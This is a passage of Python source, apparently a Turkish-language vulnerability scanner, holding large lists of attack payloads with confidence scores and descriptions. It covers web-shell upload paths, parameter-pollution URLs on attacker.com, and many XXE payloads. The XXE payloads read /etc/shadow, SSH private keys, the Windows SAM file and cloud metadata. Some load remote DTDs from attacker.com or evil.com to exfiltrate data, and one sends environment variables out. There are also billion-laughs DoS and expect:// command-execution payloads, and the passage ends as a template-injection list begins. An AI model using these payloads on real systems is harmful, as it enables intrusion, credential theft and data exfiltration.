    {"payload": "http://localhost/uploads/shell.php", "guven": 0.87, "aciklama": "Generic upload dir"},
    {"payload": "http://localhost/files/shell.php", "guven": 0.86, "aciklama": "Generic files dir"},
    {"payload": "http://localhost/media/shell.php", "guven": 0.85, "aciklama": "Media directory"},
    {"payload": "http://localhost/assets/shell.php", "guven": 0.84, "aciklama": "Assets directory"},
    {"payload": "http://localhost/images/shell.php", "guven": 0.83, "aciklama": "Images directory"},
    {"payload": "http://localhost/documents/shell.php", "guven": 0.82, "aciklama": "Documents directory"},
    {"payload": "http://localhost/downloads/shell.php", "guven": 0.81, "aciklama": "Downloads directory"},
    {"payload": "http://localhost/temp/shell.php", "guven": 0.85, "aciklama": "Temp directory"},
    {"payload": "http://localhost/tmp/shell.php", "guven": 0.84, "aciklama": "Tmp directory"},
    {"payload": "http://localhost/cache/shell.php", "guven": 0.83, "aciklama": "Cache directory"},
    {"payload": "http://localhost/logs/shell.php", "guven": 0.82, "aciklama": "Logs directory"},
    {"payload": "http://localhost/backup/shell.php", "guven": 0.86, "aciklama": "Backup directory"},
    {"payload": "http://localhost/backups/shell.php", "guven": 0.85, "aciklama": "Backups directory"},
    {"payload": "http://localhost/data/shell.php", "guven": 0.84, "aciklama": "Data directory"},
    {"payload": "http://localhost/config/shell.php", "guven": 0.88, "aciklama": "Config directory"},
    {"payload": "http://localhost/includes/shell.php", "guven": 0.87, "aciklama": "Includes directory"},
    {"payload": "http://localhost/lib/shell.php", "guven": 0.86, "aciklama": "Library directory"},
    {"payload": "http://localhost/vendor/shell.php", "guven": 0.85, "aciklama": "Vendor directory"},
    {"payload": "http://localhost/node_modules/shell.php", "guven": 0.84, "aciklama": "Node modules directory"},
    {"payload": "http://localhost/.git/config", "guven": 0.89, "aciklama": "Git config access"},
    {"payload": "http://localhost/.svn/entries", "guven": 0.88, "aciklama": "SVN entries access"},
    {"payload": "http://localhost/.env", "guven": 0.92, "aciklama": "Environment file"},
    {"payload": "http://localhost/.htaccess", "guven": 0.87, "aciklama": "Apache htaccess"},
    {"payload": "http://localhost/web.config", "guven": 0.86, "aciklama": "IIS web config"},
    {"payload": "http://localhost/robots.txt", "guven": 0.75, "aciklama": "Robots file"},
    {"payload": "http://localhost/sitemap.xml", "guven": 0.74, "aciklama": "Sitemap file"},

    # Advanced Parameter Pollution (471-500)
    {"payload": "http://attacker.com/shell.php?file=shell.php&file=../../etc/passwd", "guven": 0.88, "aciklama": "HTTP parameter pollution"},
    {"payload": "http://attacker.com/shell.php?file[]=shell.php&file[]=../../etc/passwd", "guven": 0.87, "aciklama": "Array parameter pollution"},
    {"payload": "http://attacker.com/shell.php?file.php=shell.php", "guven": 0.86, "aciklama": "Extension in parameter"},
    {"payload": "http://attacker.com/shell.php?file%00=shell.php", "guven": 0.89, "aciklama": "Null byte in parameter"},
    {"payload": "http://attacker.com/shell.php?file%20=shell.php", "guven": 0.85, "aciklama": "Space in parameter"},
    {"payload": "http://attacker.com/shell.php?file%09=shell.php", "guven": 0.84, "aciklama": "Tab in parameter"},
    {"payload": "http://attacker.com/shell.php?file%0a=shell.php", "guven": 0.83, "aciklama": "Newline in parameter"},
    {"payload": "http://attacker.com/shell.php?file%0d=shell.php", "guven": 0.82, "aciklama": "Carriage return parameter"},
    {"payload": "http://attacker.com/shell.php?file%0c=shell.php", "guven": 0.81, "aciklama": "Form feed parameter"},
    {"payload": "http://attacker.com/shell.php?file%0b=shell.php", "guven": 0.80, "aciklama": "Vertical tab parameter"},
    {"payload": "http://attacker.com/shell.php?file%a0=shell.php", "guven": 0.79, "aciklama": "Non-breaking space param"},
    {"payload": "http://attacker.com/shell.php?file%ff=shell.php", "guven": 0.85, "aciklama": "High byte parameter"},
    {"payload": "http://attacker.com/shell.php?file%01=shell.php", "guven": 0.84, "aciklama": "Control char parameter"},
    {"payload": "http://attacker.com/shell.php?file%1f=shell.php", "guven": 0.83, "aciklama": "Unit separator param"},
    {"payload": "http://attacker.com/shell.php?file%7f=shell.php", "guven": 0.82, "aciklama": "DEL char parameter"},
    {"payload": "http://attacker.com/shell.php?%66ile=shell.php", "guven": 0.86, "aciklama": "URL encoded param name"},
    {"payload": "http://attacker.com/shell.php?fi%6ce=shell.php", "guven": 0.85, "aciklama": "Partial URL encoded param"},
    {"payload": "http://attacker.com/shell.php?FILE=shell.php", "guven": 0.84, "aciklama": "Uppercase parameter"},
    {"payload": "http://attacker.com/shell.php?File=shell.php", "guven": 0.83, "aciklama": "Mixed case parameter"},
    {"payload": "http://attacker.com/shell.php?file‌=shell.php", "guven": 0.87, "aciklama": "Zero-width param"},
    {"payload": "http://attacker.com/shell.php?file​=shell.php", "guven": 0.86, "aciklama": "Zero-width space param"},
    {"payload": "http://attacker.com/shell.php?file﻿=shell.php", "guven": 0.85, "aciklama": "BOM in parameter"},
    {"payload": "http://attacker.com/shell.php?file%ufeff=shell.php", "guven": 0.84, "aciklama": "Unicode BOM parameter"},
    {"payload": "http://attacker.com/shell.php?file%u0000=shell.php", "guven": 0.88, "aciklama": "Unicode null parameter"},
    {"payload": "http://attacker.com/shell.php?file%u0020=shell.php", "guven": 0.83, "aciklama": "Unicode space parameter"},
    {"payload": "http://attacker.com/shell.php?file%u00a0=shell.php", "guven": 0.82, "aciklama": "Unicode NBSP parameter"},
    {"payload": "http://attacker.com/shell.php?file%u2000=shell.php", "guven": 0.81, "aciklama": "Unicode en quad param"},
    {"payload": "http://attacker.com/shell.php?file%u2028=shell.php", "guven": 0.85, "aciklama": "Line separator param"},
    {"payload": "http://attacker.com/shell.php?file%u2029=shell.php", "guven": 0.84, "aciklama": "Paragraph separator"},
    {"payload": "http://attacker.com/shell.php?file%u3000=shell.php", "guven": 0.83, "aciklama": "Ideographic space param"}
],

            
            ZafiyetTipi.XXE: [
                # Temel XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", "guven": 0.95, "aciklama": "Temel dosya okuma XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/evil.dtd'>]><root>&test;</root>", "guven": 0.9, "aciklama": "Uzaktan DTD yükleme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root></root>", "guven": 0.9, "aciklama": "Parameter entity XXE"},
    {"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>", "guven": 0.9, "aciklama": "ISO encoding XXE"},
    
    # Ek XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/shadow'>]><root>&test;</root>", "guven": 0.95, "aciklama": "Shadow dosya okuma XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///windows/win.ini'>]><root>&test;</root>", "guven": 0.9, "aciklama": "Windows dosya okuma XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://attacker.com/malicious.dtd\"> %dtd; %all; %send;]><root></root>", "guven": 0.95, "aciklama": "Data exfiltration XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'expect://id'>]><root>&test;</root>", "guven": 0.9, "aciklama": "Expect wrapper XXE"},
    
    # Gelişmiş Dosya Okuma Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Sistem sürüm bilgisi okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Ortam değişkenleri okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Komut satırı parametreleri okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Hosts dosyası okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Hostname okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/issue\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Issue dosyası okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "DNS konfigürasyonu okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/fstab\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Dosya sistemi tablosu okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/crontab\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Cron tablosu okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/auth.log\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Kimlik doğrulama logları okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/syslog\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Sistem logları okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///home/user/.bash_history\">]><root>&xxe;</root>", "guven": 0.75, "aciklama": "Bash geçmişi okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "SSH private key okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///home/user/.ssh/authorized_keys\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "SSH authorized keys okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Root SSH key okuma"},
    
    # Windows Sistemler İçin Payloadlar
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Windows hosts dosyası okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Windows boot konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system.ini\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Windows sistem konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Windows konfigürasyon dosyası"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/sam\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Windows SAM dosyası okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/system\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Windows sistem registry"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/security\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Windows güvenlik registry"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/inetpub/wwwroot/web.config\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "IIS web konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/program files/mysql/my.ini\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "MySQL konfigürasyon dosyası"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/xampp/apache/conf/httpd.conf\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "XAMPP Apache konfigürasyonu"},
    
    # Uzaktan DTD Yükleme Varyasyonları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/malicious.dtd\">%remote;]><root></root>", "guven": 0.9, "aciklama": "Uzaktan parameter entity yükleme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"https://evil.com/exploit.dtd\">%dtd;%all;%send;]><root></root>", "guven": 0.9, "aciklama": "HTTPS üzerinden DTD yükleme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"ftp://evil.com/malicious.dtd\">%remote;]><root></root>", "guven": 0.85, "aciklama": "FTP üzerinden DTD yükleme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"file://evil.com/share/malicious.dtd\">%remote;]><root></root>", "guven": 0.8, "aciklama": "SMB share DTD yükleme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % oob SYSTEM \"http://attacker.com/oob.dtd\">%oob;%init;%trick;]><root></root>", "guven": 0.95, "aciklama": "Out-of-band data exfiltration"},
    
    # Blind XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob SYSTEM \"http://attacker.com/oob.dtd\">%oob;]><root></root>", "guven": 0.9, "aciklama": "Blind XXE dosya okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % data SYSTEM \"file:///etc/shadow\"><!ENTITY % param1 SYSTEM \"http://attacker.com/dtd?%data;\">%param1;]><root></root>", "guven": 0.9, "aciklama": "Blind XXE parameter geçirme"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/test.dtd\">%remote;%intern;%trick;]><root></root>", "guven": 0.85, "aciklama": "Blind XXE zincir saldırısı"},
    
    # Error-based XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % error \"<!ENTITY content SYSTEM '%nonexistent;/%file;'>\">%error;%content;]><root></root>", "guven": 0.85, "aciklama": "Error-based XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/shadow\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]><root></root>", "guven": 0.85, "aciklama": "Error-based shadow okuma"},
    
    # PHP Wrapper Saldırıları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "PHP filter wrapper base64"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "PHP kaynak kodu okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"data://text/plain;base64,SGVsbG8gV29ybGQ=\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Data wrapper kullanımı"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Expect wrapper komut çalıştırma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://input\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "PHP input stream"},
    
    # CDATA Bölümlü Payloadlar
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><![CDATA[&xxe;]]></root>", "guven": 0.85, "aciklama": "CDATA ile XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY data \"<![CDATA[%file;]]>\">]><root>&data;</root>", "guven": 0.8, "aciklama": "CDATA parameter entity"},
    
    # Unicode ve Encoding Saldırıları
    {"payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "UTF-16 encoding XXE"},
    {"payload": "<?xml version=\"1.0\" encoding=\"UTF-32\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "UTF-32 encoding XXE"},
    {"payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "ISO-8859-1 encoding"},
    
    # Nested Entity Saldırıları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY outer \"<!ENTITY inner SYSTEM 'file:///etc/passwd'>\">]><root>&outer;&inner;</root>", "guven": 0.75, "aciklama": "İç içe entity tanımları"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % param1 \"<!ENTITY % param2 SYSTEM 'file:///etc/passwd'>\">%param1;%param2;]><root></root>", "guven": 0.8, "aciklama": "İç içe parameter entities"},
    
    # Billion Laughs DoS Varyasyonları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>", "guven": 0.9, "aciklama": "Entity expansion DoS"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"1234567890\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;\">]><bomb>&c;</bomb>", "guven": 0.9, "aciklama": "XML bomb saldırısı"},
    
    # SQL Server XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"\\\\attacker.com\\share\\malicious.dtd\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "UNC path XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"\\\\127.0.0.1\\c$\\windows\\win.ini\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Local UNC share access"},
    
    # Java Specific XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Java netdoc protocol"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Java JAR protocol"},
    
    # XXE ile Port Scanning
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22/\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Local port scanning"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Internal service enumeration"},
    
    # Cloud Metadata Saldırıları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "AWS metadata okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "GCP metadata okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance?api-version=2017-08-01\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Azure metadata okuma"},
    
    # SVG XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>", "guven": 0.85, "aciklama": "SVG dosyası içinde XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % oob SYSTEM \"http://attacker.com/oob.dtd\">%oob;]><svg></svg>", "guven": 0.85, "aciklama": "SVG blind XXE"},
    
    # SOAP XXE Payloadları
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>", "guven": 0.9, "aciklama": "SOAP envelope XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE methodCall [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><methodCall><methodName>&xxe;</methodName></methodCall>", "guven": 0.85, "aciklama": "XML-RPC XXE"},
    
    # RSS/Atom Feed XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss><channel><title>&xxe;</title></channel></rss>", "guven": 0.8, "aciklama": "RSS feed XXE"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE feed [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><feed><title>&xxe;</title></feed>", "guven": 0.8, "aciklama": "Atom feed XXE"},
    
    # XML Sitemap XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE urlset [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><urlset><url><loc>&xxe;</loc></url></urlset>", "guven": 0.8, "aciklama": "XML sitemap XXE"},
    
    # XSLT XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE stylesheet [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><xsl:stylesheet>&xxe;</xsl:stylesheet>", "guven": 0.85, "aciklama": "XSLT stylesheet XXE"},
    
    # WSDL XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE definitions [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><definitions>&xxe;</definitions>", "guven": 0.85, "aciklama": "WSDL dosyası XXE"},
    
    # XInclude Saldırıları
    {"payload": "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>", "guven": 0.9, "aciklama": "XInclude saldırısı"},
    {"payload": "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://attacker.com/evil.xml\"/></root>", "guven": 0.85, "aciklama": "XInclude uzaktan dosya"},
    
    # Advanced Parameter Entity Tricks
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % sp SYSTEM \"http://attacker.com/sp.dtd\">%sp;%param1;%exfil;]><root></root>", "guven": 0.9, "aciklama": "Gelişmiş parameter entity chain"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % data SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/combine.dtd\">%dtd;]><root></root>", "guven": 0.85, "aciklama": "CDATA ile veri birleştirme"},
    
    # Mixed Content Attacks
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///proc/self/environ\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://attacker.com/?%start;%file;%end;'>\">%all;]><root>&send;</root>", "guven": 0.9, "aciklama": "Environ veri sızıntısı"},
    
    # Protocol Handler Exploits
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"gopher://attacker.com:70/evil\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Gopher protocol handler"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"dict://attacker.com:2628/\">]><root>&xxe;</root>", "guven": 0.75, "aciklama": "Dict protocol handler"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"ldap://attacker.com/\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "LDAP protocol handler"},
    
    # Time-based Blind XXE
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://slow-server.com/delay.dtd\">%remote;]><root></root>", "guven": 0.8, "aciklama": "Time-based blind XXE"},
    
    # Database-specific Payloads
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/lib/mysql/mysql/user.frm\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "MySQL user tablosu okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/lib/postgresql/data/pg_hba.conf\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "PostgreSQL konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/mongodb.conf\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "MongoDB konfigürasyonu"},
    
    # Web Server Config Files
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/apache2/apache2.conf\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Apache konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Nginx konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///usr/local/apache2/conf/httpd.conf\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Apache httpd.conf"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/apache2/sites-enabled/000-default\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Apache virtual host"},
    
    # Application Config Files
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "PHP konfigürasyon dosyası"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/html/wp-config.php\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "WordPress konfigürasyonu"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/html/.env\">]><root>&xxe;</root>", "guven": 0.9, "aciklama": "Environment dosyası okuma"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///home/user/application.properties\">]><root>&xxe;</root>", "guven": 0.85, "aciklama": "Java application properties"},
    
    # Log Files
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Apache access logları"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/error.log\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Apache error logları"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/nginx/access.log\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Nginx access logları"},
    {"payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/log/messages\">]><root>&xxe;</root>", "guven": 0.8, "aciklama": "Sistem mesaj logları"},
    
            ],
            
ZafiyetTipi.SSTI: [
               # Temel Template Injection Payloadları
    {"payload": "{{7*7}}", "guven": 0.85, "aciklama": "Temel matematik işlemi"},
    {"payload": "${7*7}", "guven": 0.85, "aciklama": "Dollar bracket matematik"},
    {"payload": "{{config}}", "guven": 0.9, "aciklama": "Konfigürasyon bilgisi erişimi"},
